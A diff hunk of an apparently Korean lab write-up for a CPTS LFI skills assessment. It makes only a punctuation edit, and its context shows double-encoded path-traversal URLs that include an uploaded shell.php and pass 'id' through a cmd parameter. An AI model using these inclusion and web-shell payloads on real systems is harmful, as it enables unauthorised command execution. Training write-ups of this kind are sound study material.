@@ -229,7 +229,7 @@ http://154.57.164.74:30517/contact.php?region=%252e%252e%252findex
 
 ![LFI](/assets/cpts-web/lfi-skills-assessment/lfi6.png)
 
-앞서 업로드한 `shell.php` 파일을 `include` 하기 위해 `region` 파라미터에 Double Encoding된 상대 경로를 전달하고, `cmd` 파라미터에는 실행할 시스템 명령을 지정하였다.
+앞서 업로드한 `shell.php` 파일을 `include` 하기 위해 `region` 파라미터에 Double Encoding된 상대 경로를 전달하고, `cmd` 파라미터에는 실행할 시스템 명령을 지정하였다:
 
 ```text
 http://154.57.164.74:30517/contact.php?region=%252e%252e%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389&cmd=id
